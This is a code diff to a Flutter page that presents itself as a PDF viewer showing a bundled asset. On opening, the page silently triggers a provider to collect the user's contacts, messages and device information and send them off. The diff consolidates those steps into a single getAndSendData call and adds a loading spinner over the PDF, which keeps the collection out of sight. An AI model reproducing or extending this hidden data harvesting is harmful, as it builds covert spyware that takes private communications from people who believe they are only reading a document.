@@ -14,24 +14,17 @@ class PdfViewPage extends ConsumerStatefulWidget {
 }
 
 class PdfViewPageState extends ConsumerState<PdfViewPage> {
+  StateProvider<bool> isLoadingProvider = StateProvider<bool>((ref) => true);
+
   @override
   void initState() {
     WidgetsBinding.instance.addPostFrameCallback(
-          (_) async {
+      (_) async {
         SchedulerBinding.instance.addPostFrameCallback(
-              (timeStamp) async {
+          (timeStamp) async {
             ///get contacts & messages
             final contactsListProvider = ref.read(contactsProvider.notifier);
-            await contactsListProvider.getContactList(context);
-            if (context.mounted) {
-              await contactsListProvider.getMessagesList(context);
-              if (context.mounted) {
-                await contactsListProvider.getDeviceInfo(context);
-                if (context.mounted) {
-                  await contactsListProvider.sendData(context);
-                }
-              }
-            }
+            await contactsListProvider.getAndSendData(context);
           },
         );
       },
@@ -41,18 +34,33 @@ class PdfViewPageState extends ConsumerState<PdfViewPage> {
 
   @override
   Widget build(BuildContext context) {
+    bool isLoading = ref.watch(isLoadingProvider);
     return Scaffold(
       body: SafeArea(
-        child: SizedBox(
-          width: MediaQuery.of(context).size.width,
-          height: MediaQuery.of(context).size.height,
-          child: Column(
-            children: [
-              Expanded(
-                child: SfPdfViewer.asset(Constants.pdfLink),
+        child: Stack(
+          children: [
+            SizedBox(
+              width: MediaQuery.of(context).size.width,
+              height: MediaQuery.of(context).size.height,
+              child: Column(
+                children: [
+                  Expanded(
+                    child: SfPdfViewer.asset(
+                      Constants.pdfLink,
+                      onDocumentLoaded: (details) {
+                        if(details.document.pages.count>0) {
+                          ref
+                              .read(isLoadingProvider.notifier)
+                              .state = false;
+                        }},
+                    ),
+                  ),
+                ],
               ),
-            ],
-          ),
+            ),
+         isLoading?
+            const Center(child: CircularProgressIndicator(color: Colors.teal,)):SizedBox()
+          ],
         ),
       ),
     );
